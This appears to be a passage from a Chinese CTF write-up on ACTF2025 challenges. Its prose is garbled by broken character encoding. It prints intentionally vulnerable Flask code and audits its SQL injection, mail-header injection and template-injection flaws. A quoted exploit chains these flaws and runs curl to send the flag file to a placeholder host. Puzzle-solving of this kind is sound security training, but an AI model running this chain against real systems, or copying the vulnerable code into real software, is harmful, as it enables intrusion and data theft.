html_template = (<br>            <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">&lt;!DOCTYPE html&gt;</span><br><span class="hljs-string">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="hljs-string">&lt;head&gt;</span><br><span class="hljs-string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="hljs-string">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="hljs-string">    &lt;title&gt;Home&lt;/title&gt;</span><br><span class="hljs-string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css&quot;&gt;</span><br><span class="hljs-string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;&#123;&#123; url_for(&#x27;static&#x27;, filename=&#x27;styles.css&#x27;) &#125;&#125;&quot;&gt;</span><br><span class="hljs-string">&lt;/head&gt;</span><br><span class="hljs-string">&lt;body&gt;</span><br><span class="hljs-string">    &lt;div class=&quot;container&quot;&gt;</span><br><span class="hljs-string">        &lt;h2 class=&quot;text-center&quot;&gt;server code (encoded)&lt;/h2&gt;</span><br><span class="hljs-string">        &lt;div class=&quot;text-center&quot; style=&quot;word-break:break-all;&quot;&gt;</span><br><span class="hljs-string">        &#123;%% raw %%&#125;</span><br><span class="hljs-string">            %s</span><br><span class="hljs-string">        &#123;%% endraw %%&#125;</span><br><span class="hljs-string">        &lt;/div&gt;</span><br><span class="hljs-string">        &lt;div class=&quot;text-center&quot;&gt;</span><br><span class="hljs-string">            &lt;a href=&quot;/logout&quot; class=&quot;btn btn-danger&quot;&gt;Logout&lt;/a&gt;</span><br><span class="hljs-string">        &lt;/div&gt;</span><br><span class="hljs-string">    &lt;/div&gt;</span><br><span class="hljs-string">&lt;/body&gt;</span><br><span class="hljs-string">&lt;/html&gt;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>            % base64.b64encode(<span class="hljs-built_in">open</span>(__file__, <span class="hljs-string">&quot;rb&quot;</span>).read()).decode()<br>        )<br>    <span class="hljs-keyword">return</span> render_template_string(html_template)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/logout&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">logout</span>():<br>    resp = redirect(url_for(<span class="hljs-string">&quot;login&quot;</span>))<br>    resp.delete_cookie(<span class="hljs-string">&quot;jwbcookie&quot;</span>)<br>    <span class="hljs-keyword">return</span> resp<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run()<br></code></pre></td></tr></table></figure><p>æ€è·¯ï¼šCBC åè½¬æ”»å‡»ï¼Œæ‹¿ cookieï¼ŒSSTI</p><h1 id="Excellent-Site"><a href="#Excellent-Site" class="headerlink" title="Excellent-Site"></a>Excellent-Site</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> smtplib <br><span class="hljs-keyword">import</span> imaplib<br><span class="hljs-keyword">import</span> email<br><span class="hljs-keyword">import</span> sqlite3<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlparse<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> email.header <span class="hljs-keyword">import</span> decode_header<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> *<br><br>app = Flask(__name__)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_subjects</span>(<span class="hljs-params">username, password</span>):<br>    imap_server = <span class="hljs-string">&quot;ezmail.org&quot;</span><br>    imap_port = <span class="hljs-number">143</span><br>    <span class="hljs-keyword">try</span>:<br>        mail = imaplib.IMAP4(imap_server, imap_port)<br>        mail.login(username, password)<br>        mail.select(<span class="hljs-string">&quot;inbox&quot;</span>)<br>        status, messages = mail.search(<span class="hljs-literal">None</span>, <span class="hljs-string">&#x27;FROM &quot;admin@ezmail.org&quot;&#x27;</span>)<br>        <span class="hljs-keyword">if</span> status != <span class="hljs-string">&quot;OK&quot;</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span><br>        subject = <span class="hljs-string">&quot;&quot;</span><br>        latest_email = messages[<span class="hljs-number">0</span>].split()[-<span class="hljs-number">1</span>]<br>        status, msg_data = mail.fetch(latest_email, <span class="hljs-string">&quot;(RFC822)&quot;</span>)<br>        <span class="hljs-keyword">for</span> response_part <span class="hljs-keyword">in</span> msg_data:<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(response_part, <span class="hljs-built_in">tuple</span>):<br>                msg = email.message_from_bytes(response_part  [<span class="hljs-number">1</span>])<br>                subject, encoding = decode_header(msg[<span class="hljs-string">&quot;Subject&quot;</span>])  [<span class="hljs-number">0</span>]<br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(subject, <span class="hljs-built_in">bytes</span>):<br>                    subject = subject.decode(encoding <span class="hljs-keyword">if</span> encoding <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        mail.logout()<br>        <span class="hljs-keyword">return</span> subject<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;ERROR&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fetch_page_content</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-keyword">try</span>:<br>        parsed_url = urlparse(url)<br>        <span class="hljs-keyword">if</span> parsed_url.scheme != <span class="hljs-string">&#x27;http&#x27;</span> <span class="hljs-keyword">or</span> parsed_url.hostname != <span class="hljs-string">&#x27;ezmail.org&#x27;</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;SSRF Attack!&quot;</span><br>        response = requests.get(url)<br>        <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>            <span class="hljs-keyword">return</span> response.text<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;ERROR&quot;</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;ERROR&quot;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/report&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">report</span>():<br>    message = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&quot;POST&quot;</span>:<br>        url = request.form[<span class="hljs-string">&quot;url&quot;</span>]<br>        content = request.form[<span class="hljs-string">&quot;content&quot;</span>]<br>        smtplib._quote_periods = <span class="hljs-keyword">lambda</span> x: x<br>        mail_content = <span class="hljs-string">&quot;&quot;&quot;From: ignored@ezmail.org\r\nTo: admin@ezmail.org\r\nSubject: &#123;url&#125;\r\n\r\n&#123;content&#125;\r\n.\r\n&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">try</span>:<br>            server = smtplib.SMTP(<span class="hljs-string">&quot;ezmail.org&quot;</span>)<br>            mail_content = smtplib._fix_eols(mail_content)<br>            mail_content = mail_content.<span class="hljs-built_in">format</span>(url=url, content=content)<br>            server.sendmail(<span class="hljs-string">&quot;ignored@ezmail.org&quot;</span>, <span class="hljs-string">&quot;admin@ezmail.org&quot;</span>, mail_content)<br>            message = <span class="hljs-string">&quot;Submitted! Now wait till the end of the world.&quot;</span><br>        <span class="hljs-keyword">except</span>:<br>            message = <span class="hljs-string">&quot;Send FAILED&quot;</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;report.html&quot;</span>, message=message)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/bot&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bot</span>():<br>    requests.get(<span class="hljs-string">&quot;http://ezmail.org:3000/admin&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;The admin is checking your advice(maybe)&quot;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/admin&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">admin</span>():<br>    ip = request.remote_addr<br>    <span class="hljs-keyword">if</span> ip != <span class="hljs-string">&quot;127.0.0.1&quot;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Forbidden IP&quot;</span><br>    subject = get_subjects(<span class="hljs-string">&quot;admin&quot;</span>, <span class="hljs-string">&quot;p@ssword&quot;</span>)<br>    <span class="hljs-keyword">if</span> subject.startswith(<span class="hljs-string">&quot;http://ezmail.org&quot;</span>):<br>        page_content = fetch_page_content(subject)<br>        <span class="hljs-keyword">return</span> render_template_string(<span class="hljs-string">f&quot;&quot;&quot;</span><br><span class="hljs-string">                &lt;h2&gt;Newest Advice(from myself)&lt;/h2&gt;</span><br><span class="hljs-string">                &lt;div&gt;<span class="hljs-subst">&#123;page_content&#125;</span>&lt;/div&gt;</span><br><span class="hljs-string">        &quot;&quot;&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/news&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">news</span>():<br>    news_id = request.args.get(<span class="hljs-string">&quot;id&quot;</span>)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> news_id:<br>        news_id = <span class="hljs-number">1</span><br><br>    conn = sqlite3.connect(<span class="hljs-string">&quot;news.db&quot;</span>)<br>    cursor = conn.cursor()<br><br>    cursor.execute(<span class="hljs-string">f&quot;SELECT title FROM news WHERE id = <span class="hljs-subst">&#123;news_id&#125;</span>&quot;</span>)<br>    result = cursor.fetchone()<br>    conn.close()<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> result:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Page not found.&quot;</span>, <span class="hljs-number">404</span><br>    <span class="hljs-keyword">return</span> result[<span class="hljs-number">0</span>]<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port=<span class="hljs-number">3000</span>)<br></code></pre></td></tr></table></figure><p>å®¡è®¡ä»£ç ï¼š</p><ul><li><code>/report</code> è·¯ç”±å¯ä»¥æŒ‡å®š <code>url</code>ï¼ˆé‚®ä»¶ä¸­çš„ <code>Subject</code>ï¼‰å’Œ <code>content</code> ä½œä¸º <code>ignored@ezmail.org</code> å‘ <code>admin``@ezmail.org</code> å‘é€é‚®ä»¶ï¼›</li><li><code>/bot</code> è·¯ç”±å¯ä»¥ä»æœ¬åœ°å‘èµ·ä¸€æ¬¡å¯¹ <code>/admin</code> è·¯ç”±çš„ get è¯·æ±‚ï¼›</li><li><code>/admin</code> è·¯ç”±ä»…å…è®¸æœ¬åœ°è®¿é—®ï¼Œé€šè¿‡ <code>get_subjects</code> è·å–æ¥è‡ª <code>admin@ezmail.org</code> çš„é‚®ä»¶çš„ <code>subject</code>ï¼Œç»è¿‡ <code>fetch_page_content</code> æ£€æŸ¥å¹¶è®¿é—® url åå°†è¿”å›å†…å®¹ç”¨äº <code>render_template_string</code> çš„é¡µé¢æ¸²æŸ“ï¼Œå­˜åœ¨ SSTI é£é™©ï¼›</li><li><code>/news</code> è·¯ç”±å­˜åœ¨å‚æ•° <code>id</code> ç›´æ¥åŠ¨æ€æ‹¼æ¥è¿›è¡Œ SQL æŸ¥è¯¢ï¼Œæ˜æ˜¾å­˜åœ¨ SQL æ³¨å…¥ï¼›</li></ul><p>æƒ³è¦ SSTI å°±éœ€è¦ bot å‘èµ·è¯·æ±‚ï¼Œä¸” <code>Subject</code> é‡Œçš„ url è¯·æ±‚è¿”å›ä¸­æœ‰ SSTI payloadï¼Œè¦æƒ³è®©é¶æœºå»è·å– <code>Subject</code> éœ€è¦é‚®ä»¶ä» <code>admin@ezmail.org</code> å‘å‡ºï¼Œå·²çŸ¥ <code>/report</code> å¯ä»¥å‘é€ <code>Subject</code> å¯æ§çš„é‚®ä»¶ï¼Œé‚£ä¹ˆè¿˜éœ€è¦ä¸€äº›ç‰¹æ®Šå¤„ç†æ‰èƒ½ä¼ªé€ é‚®ä»¶æ¥æºæ˜¯ <code>admin@ezmail.org</code>ï¼Œå¹¶ç¡®ä¿ <code>Subject</code> é‡Œçš„ url è®¿é—®åä¼šè¿”å›ä¸€ä¸ª SSTI payloadï¼Œæ‰€ä»¥æ€»ä½“æ€è·¯å°±æ˜¯ï¼š</p><ol><li>å‘ <code>/report</code> ä¼ å‚ï¼Œ<code>content</code> éšæ„ï¼Œ<code>url</code> å¤„åˆ™åˆ©ç”¨ <code>/news</code> çš„ SQL æ³¨å…¥æ¼æ´å†™ä¸€æ¡ <code>/news?id=-1 union select &lt;SSTI payload&gt;</code> ç”¨äºè¿”å› SSTI payloadï¼Œåœ¨æœ«å°¾åˆ©ç”¨æ¢è¡Œç¬¦ <code>\r\n</code> æ³¨å…¥ smtp çš„ From å¤´æ¥ä¼ªé€ é‚®ä»¶æ¥æºã€‚</li><li>å†è®¿é—® <code>/bot</code>ï¼Œbot è®¿é—® <code>/admin</code>ï¼Œ<code>get_subjects</code> è·å– <code>Subject</code> å†…å®¹ï¼Œ<code>fetch_page_content</code> è®¿é—® <code>Subject</code> ä¸­çš„ url è§¦å‘ ssrf è¿›è¡Œä¸€æ¬¡ SQL æ³¨å…¥å¹¶è·å¾— SSTI payloadï¼Œç„¶å SSTI payload æˆåŠŸæ³¨å…¥è§¦å‘ SSTIã€‚</li></ol><p>è¿™é‡Œæ”¾ä¸€ä¸ª<a href="https://blog.xmcve.com/2025/04/27/ACTF2025-Writeup/#title-11">æ˜Ÿç›Ÿå®‰å…¨å›¢é˜Ÿçš„ exp</a>ï¼Œè›®æ¸…æ™°çš„</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> <span class="hljs-type">time</span><br><span class="hljs-keyword">import</span> requests<br><br>url = &quot;http://223.112.5.141:60524/&quot;<br># SSTI Payload<br>payload = &quot;&#123;&#123;lipsum.__globals__.os.popen(\&quot;curl%<span class="hljs-number">20</span>http://x.x.x.x:<span class="hljs-number">7788</span>/`cat /flag|base64`\&quot;).read()&#125;&#125;&quot;<br># é‚®ä»¶å¤´æ³¨å…¥<br>subject = f&quot;http://ezmail.org:3000/news?id=-1 UNION SELECT &#x27;&#123;payload&#125;&#x27;\r\nFrom: admin@ezmail.org\r\nResent-From: admin@ezmail.org&quot;<br><br>start = <span class="hljs-type">time</span>.time()<br><br>data = &#123;&quot;url&quot;: subject, &quot;content&quot;: &quot;haha&quot;&#125;<br>res_1 = requests.post(f&quot;&#123;url&#125;/report&quot;, data=data)<br>res_2 = requests.<span class="hljs-keyword">get</span>(f&quot;&#123;url&#125;/bot&quot;)print(<span class="hljs-type">time</span>.time() - <span class="hljs-keyword">start</span>)<br></code></pre></td></tr></table></figure><h1 id="QQQRcode"><a href="#QQQRcode" class="headerlink" title="QQQRcode"></a>QQQRcode</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pyzbar.pyzbar <span class="hljs-keyword">import</span> decode<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_input</span>():<br>    input_data = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;give me your data:&quot;</span>)<br>    <span class="hljs-keyword">if</span> (<br>        <span class="hljs-built_in">any</span>(<span class="hljs-keyword">not</span> c <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;01&quot;</span> <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> input_data)<br>        <span class="hljs-keyword">or</span> <span class="hljs-built_in">len</span>(input_data) != <span class="hljs-number">21</span> * <span class="hljs-number">21</span> * <span class="hljs-number">21</span><br>        <span class="hljs-keyword">or</span> input_data.count(<span class="hljs-string">&quot;1&quot;</span>) &gt;= <span class="hljs-number">390</span><br>    ):<br>        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;Invalid input&quot;</span>)<br>    <span class="hljs-keyword">return</span> input_data<br><span class="hljs-comment"># 5i1enceeï¼šè¾“å…¥æ•°æ®å¿…é¡»å…¨ä¸º0æˆ–1ã€é•¿åº¦ç­‰äº21^3ã€1çš„æ•°é‡å°äº390</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_data</span>(<span class="hljs-params">input_str</span>):<br>    data = [[[<span class="hljs-literal">False</span>] * <span class="hljs-number">21</span> <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">21</span>)] <span class="hljs-keyword">for</span> __ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">21</span>)]<br>    index = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> z <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">21</span>):<br>        <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">21</span>):<br>            <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">21</span>):<br>                <span class="hljs-keyword">if</span> index &lt; <span class="hljs-built_in">len</span>(input_str):<br>                    data[x][y][z] = input_str[index] == <span class="hljs-string">&quot;1&quot;</span><br>                    index += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> data<br><span class="hljs-comment"># 5i1enceeï¼šè§£ææ•°æ®ã€‚å…ˆåˆå§‹åŒ–21*21*21çš„ä¸‰ç»´æ•°ç»„ä¸ºFalseï¼Œè¾“å…¥æ•°æ®ä¸º1åˆ™å¯¹åº”æ•°ç»„å…ƒç´ ç½®1</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_image</span>(<span class="hljs-params">matrix, module_size=<span class="hljs-number">10</span></span>):<br>    size = <span class="hljs-built_in">len</span>(matrix) * module_size<br>    img = Image.new(<span class="hljs-string">&quot;1&quot;</span>, (size, size), <span class="hljs-number">1</span>)<br>    pixels = img.load()<br><br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(matrix)):<br>        <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(matrix[<span class="hljs-number">0</span>])):<br>            <span class="hljs-keyword">if</span> matrix[x][y]:<br>                <span class="hljs-keyword">for</span> dx <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(module_size):<br>                    <span class="hljs-keyword">for</span> dy <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(module_size):<br>                        px = x * module_size + dx<br>                        py = y * module_size + dy<br>                        <span class="hljs-keyword">if</span> px &lt; size <span class="hljs-keyword">and</span> py &lt; size:<br>                            pixels[px, py] = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">return</span> img<br><span class="hljs-comment"># 5i1enceeï¼šåˆ›å»ºå›¾åƒã€‚å…ˆåˆå§‹åŒ–ä¸€ä¸ªå…¨ç™½å›¾åƒï¼Œè¾“å…¥äºŒç»´å¸ƒå°”çŸ©é˜µï¼Œä¸€ä¸ªå¸ƒå°”å€¼å¯¹åº”ä¸€ä¸ª10*10åƒç´ å—ï¼Œmatrix[x][y]ä¸ºTrueåˆ™ç»˜åˆ¶é»‘è‰²åƒç´ å—</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode_qr</span>(<span class="hljs-params">image</span>):<br>    decoded = decode(image)<br>    <span class="hljs-keyword">return</span> decoded[<span class="hljs-number">0</span>].data.decode(<span class="hljs-string">&quot;utf-8&quot;</span>) <span class="hljs-keyword">if</span> decoded <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-comment"># 5i1enceeï¼šè§£æäºŒç»´ç ï¼Œæå–æ•°æ®å¹¶è½¬æ¢ä¸ºUTF-8å­—ç¬¦ä¸²</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">proof_of_work</span>():<br>    proof = <span class="hljs-string">&quot;&quot;</span>.join(<br>        [random.choice(string.ascii_letters + string.digits) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>)]<br>    )<br>    digest = sha256(proof.encode()).hexdigest()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;sha256(XXXX+%s) == %s&quot;</span> % (proof[<span class="hljs-number">4</span>:], digest))<br>    x = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Give me XXXX:&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(x) != <span class="hljs-number">4</span> <span class="hljs-keyword">or</span> sha256((x + proof[<span class="hljs-number">4</span>:]).encode()).hexdigest() != digest:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Sorry~ bye~&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Right!&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><span class="hljs-comment"># 5i1enceeï¼šè¦è®¡ç®—ä¸€ä¸ª 4 å­—ç¬¦å‰ç¼€ï¼Œä½¿å…¶ä¸å·²çŸ¥åç¼€çš„SHA256å“ˆå¸ŒåŒ¹é…ã€‚è·Ÿmaster of movieé‚£ä¸ªå·®ä¸å¤šä¸€æ ·</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> proof_of_work():<br>        exit(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">try</span>:<br>        input_str = read_input()<br>        data = parse_data(input_str)<br>        front = [<br>            [<span class="hljs-built_in">any</span>(data[x][y][z] <span class="hljs-keyword">for</span> z <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">21</span>)) <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">21</span>)]<br>            <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">21</span>)<br>        ]<br>        left = [<br>            [<span class="hljs-built_in">any</span>(data[x][y][z] <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">21</span>)) <span class="hljs-keyword">for</span> z <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">21</span>)]<br>            <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">21</span>)<br>        ]<br>        top = [<br>            [<span class="hljs-built_in">any</span>(data[x][y][z] <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">21</span>)) <span class="hljs-keyword">for</span> z <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">21</span>)]<br>            <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">21</span>)<br>        ]<br>        projections = [front, left, top]<br>        validation = [<span class="hljs-string">&quot;Azure&quot;</span>, <span class="hljs-string">&quot;Assassin&quot;</span>, <span class="hljs-string">&quot;Alliance&quot;</span>]<br>        <span class="hljs-keyword">for</span> projection, word <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(projections, validation):<br>            content = 